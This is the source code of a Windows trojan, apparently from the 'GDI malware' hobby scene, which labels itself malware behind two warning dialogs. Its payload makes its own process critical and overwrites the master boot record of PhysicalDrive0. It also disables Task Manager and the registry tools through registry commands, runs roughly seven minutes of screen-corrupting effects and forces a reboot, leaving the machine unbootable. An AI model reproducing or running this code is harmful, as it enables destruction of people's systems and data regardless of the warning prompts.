// KielN17ProVenrsTchAndNticr.cpp : Defines the entry point for the console application.
//

#pragma warning(disable:4244)
#pragma warning(disable:4552)
#pragma warning(disable:4554)
#pragma warning(disable:4129)
#pragma warning(disable:4305)
#pragma warning(disable:4715)

#include "def.h"
#include "glitch.h"
#include "sound.h"
#include "payload.h"
#include "lockjawdead.h"
#include "eviloctopus.h"

void clean() {
	for (int i = 0; i<30; i++) {
		InvalidateRect(0, 0, 0);
	}
}
HRESULT DwmEnableComposition(UINT uCompositionAction) {
	typedef HRESULT(WINAPI *_dwmEnableComposition)(UINT uCompositionAction);
	HMODULE hm = LoadLibrary(_T("dwmapi.dll"));
	if (hm == NULL) return -1;
	_dwmEnableComposition dwmfunc = (_dwmEnableComposition)GetProcAddress(hm, "DwmEnableComposition");
	return dwmfunc(uCompositionAction);
}
VOID WINAPI MsgBoxCorruptionThread(HWND hwndMsgBox) {
	HDC hdc = GetDC(hwndMsgBox);
	RECT rect;
	GetWindowRect(hwndMsgBox, &rect);
	int w = rect.right - rect.left, h = rect.bottom - rect.top;
	InvalidateRect(0, 0, 0);
	for (;;) {
		SelectObject(hdc, CreateSolidBrush(RGB(rand() % 2000, rand() % 2000, rand() % 2000)));
		PatBlt(hdc, 0, 0, w, h, PATINVERT);
		Sleep(100);
	}
}

LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HCBT_ACTIVATE) {
		HWND hwndMsgBox = (HWND)wParam;
		Sleep(100);
		//		ShowWindow(hwndMsgBox, 5);
		HANDLE handle = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)MsgBoxCorruptionThread, hwndMsgBox, 0, NULL);
		return 0;
	}
	return CallNextHookEx(0, nCode, wParam, lParam);
}

typedef VOID(_stdcall* RtlSetProcessIsCritical) (
	IN BOOLEAN        NewValue,
	OUT PBOOLEAN OldValue,
	IN BOOLEAN     IsWinlogon);

BOOL EnablePriv(LPCWSTR lpszPriv) {
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tkprivs;
	ZeroMemory(&tkprivs, sizeof(tkprivs));

	if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
		return FALSE;

	if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
		CloseHandle(hToken); return FALSE;
	}

	tkprivs.PrivilegeCount = 1;
	tkprivs.Privileges[0].Luid = luid;
	tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
	CloseHandle(hToken);
	return bRet;
}

BOOL ProcessIsCritical()
{
	HANDLE hDLL;
	RtlSetProcessIsCritical fSetCritical;

	hDLL = LoadLibraryA("ntdll.dll");
	if (hDLL != NULL)
	{
		EnablePriv(SE_DEBUG_NAME);
		(fSetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");
		if (!fSetCritical) return 0;
		fSetCritical(1, 0, 0);
		return 1;
	}
	else
		return 0;
}

DWORD WINAPI MBRWiper(LPVOID lpParam) {
	DWORD dwBytesWritten;
	HANDLE hDevice = CreateFileW(
		L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		OPEN_EXISTING, 0, 0);

	WriteFile(hDevice, MasterBootRecord, 32768, &dwBytesWritten, 0);
	return 1;
}

DWORD WINAPI noskid(LPVOID lpParam)
{
	CreateDirectoryA("C:\\game", 0);
	DWORD dwBytesWritten;
	HANDLE hDevice = CreateFileW(
		L"C:\\game\\riplockjawgame.wmv", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		CREATE_ALWAYS, 0, 0);

	WriteFile(hDevice, HorseVid, 772159, &dwBytesWritten, 0); // write the file to the handle
	CloseHandle(hDevice);
	ShellExecute(0, 0, L"C:\\game\\riplockjawgame.wmv", 0, 0, SW_SHOW);
	return 0;
}

void RunPayload() {
	ProcessIsCritical();
	CreateThread(0, 0, MBRWiper, 0, 0, 0);
	Sleep(1000);
	CreateThread(0, 0, noskid, 0, 0, 0);
	Sleep(7000);
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableRegistryTools /t reg_dword /d 1 /f");

	HANDLE msg = CreateThread(NULL, 0, msgbox, NULL, 0, NULL);
	DwmEnableComposition(0);
	Sleep(1000);

	sound1();
	HANDLE sh1 = CreateThread(NULL, 0, GDIShader1, NULL, 0, NULL);
	Sleep(30000);
	TerminateThread(sh1, 0);
	InvalidateRect(0, 0, 0);
	Sleep(100);

	sound2();
	HANDLE melt = CreateThread(NULL, 0, Payload1a_Melt, NULL, 0, NULL);
	HANDLE tri = CreateThread(NULL, 0, Payload1b_Triangles, NULL, 0, NULL);
	Sleep(30000);
	TerminateThread(melt, 0);
	//	TerminateThread(tri,0);
	InvalidateRect(0, 0, 0);
	Sleep(100);

	sound3();
	HANDLE sh2 = CreateThread(NULL, 0, GDIShader2, NULL, 0, NULL);
	Sleep(30000);
	TerminateThread(sh2, 0);
	InvalidateRect(0, 0, 0);
	Sleep(100);

	sound4();
	HANDLE sh3 = CreateThread(NULL, 0, GDIShader3, NULL, 0, NULL);
	HANDLE textout = CreateThread(NULL, 0, Payload2a_Textout, NULL, 0, NULL);
	Sleep(30000);
	TerminateThread(sh3, 0);
	//	TerminateThread(textout,0);
	InvalidateRect(0, 0, 0);
	Sleep(100);

	sound5();
	HANDLE swirl = CreateThread(NULL, 0, Payload3a_Swirl, NULL, 0, NULL);
	Sleep(30000);
	TerminateThread(swirl, 0);
	InvalidateRect(0, 0, 0);
	Sleep(100);

	sound6();
	HANDLE sh4 = CreateThread(NULL, 0, GDIShader4, NULL, 0, NULL);
	HANDLE mosaic = CreateThread(NULL, 0, Payload4a_Mosaic, NULL, 0, NULL);
	Sleep(30000);
	TerminateThread(mosaic, 0);
	TerminateThread(sh4, 0);
	InvalidateRect(0, 0, 0);
	Sleep(100);

	sound7();
	HANDLE sh5 = CreateThread(NULL, 0, GDIShader5, NULL, 0, NULL);
	Sleep(30000);
	TerminateThread(sh5, 0);
	InvalidateRect(0, 0, 0);
	Sleep(100);

	sound8();
	HANDLE sh6 = CreateThread(NULL, 0, GDIShader6, NULL, 0, NULL);
	Sleep(30000);
	TerminateThread(sh6, 0);
	InvalidateRect(0, 0, 0);
	Sleep(100);

	sound9();
	HANDLE sh7 = CreateThread(NULL, 0, GDIShader7, NULL, 0, NULL);
	HANDLE iconcube = CreateThread(NULL, 0, Payload5a_IconCube, NULL, 0, NULL);
	Sleep(30000);
	TerminateThread(sh7, 0);
	//	TerminateThread(iconcube,0);
	InvalidateRect(0, 0, 0);
	Sleep(100);

	sound10();
	HANDLE melt2 = CreateThread(NULL, 0, Payload6a_Melt2, NULL, 0, NULL);
	Sleep(30000);
	TerminateThread(melt2, 0);
	InvalidateRect(0, 0, 0);
	Sleep(100);

	sound11();
	HANDLE sh8 = CreateThread(NULL, 0, GDIShader8, NULL, 0, NULL);
	Sleep(30000);
	TerminateThread(sh8, 0);
	InvalidateRect(0, 0, 0);
	Sleep(100);

	sound12();
	HANDLE swirl2 = CreateThread(NULL, 0, Payload7a_Swirl2, NULL, 0, NULL);
	Sleep(30000);
	TerminateThread(swirl2, 0);
	InvalidateRect(0, 0, 0);
	Sleep(100);

	sound13();
	HANDLE sh9 = CreateThread(NULL, 0, GDIShader9, NULL, 0, NULL);
	Sleep(30000);
	TerminateThread(sh9, 0);
	InvalidateRect(0, 0, 0);
	Sleep(100);

	sound14();
	HANDLE htrain = CreateThread(NULL, 0, Payload8a_Train, NULL, 0, NULL);
	Sleep(30000);
	TerminateThread(htrain, 0);
	TerminateThread(textout, 0);
	InvalidateRect(0, 0, 0);
	Sleep(100);

	sound15();
	HANDLE sh10 = CreateThread(NULL, 0, GDIShader10, NULL, 0, NULL);
	HANDLE textout2 = CreateThread(NULL, 0, Payload9a_TextOut2, NULL, 0, NULL);
	Sleep(30000);
	TerminateThread(sh10, 0);
	TerminateThread(textout2, 0);
	InvalidateRect(0, 0, 0);
	Sleep(100);
	system("shutdown.exe /r /t 00");
	ExitProcess(0);
}
int main() {
	InitDPI();
	srand(time(NULL));
	SeedXorshift32((DWORD)time(NULL));
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	if (MessageBoxW(NULL, L"The software you just executed is considered (no skid) malware (NoSkidTrojan.Win32.KielN17ProVenrsTchAndNticr.exe). This malware will harm your computer and makes it unusable. If you are seeing this message without knowing what you just executed, simply press No and nothing will happen. If you know what this (no skid) malware does and are using a safe environment to test, press Yes to start it. Do you want to execute this (no skid) malware, resulting in an unusable machine???", L"!!!!!!!!!!!! WARNING HELL INCOMING FOR YOU !!!!!!!!!!!!", MB_YESNO | MB_ICONERROR | MB_DEFBUTTON2) == IDYES) {
		HHOOK hMsgHook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
		if (MessageBoxW(NULL, L"This is the last warning! The creator (MazeIcon/Underwater Tiny Kong, MSAgentRocks324's Imposter, Jeremiah, User-VSGWABXCSEJEV & Trus Bus Rezky bogor OSC) is not responsible for any damage made using this (no skid) malware! Still execute it?", L"!!!!!!!!! THIS IS THE LAST WARNING !!!!!!!!!!!!", MB_YESNO | MB_ICONERROR | MB_DEFBUTTON2) == IDYES) {
			UnhookWindowsHookEx(hMsgHook);
			RunPayload();
		}
	}
	return 0;
}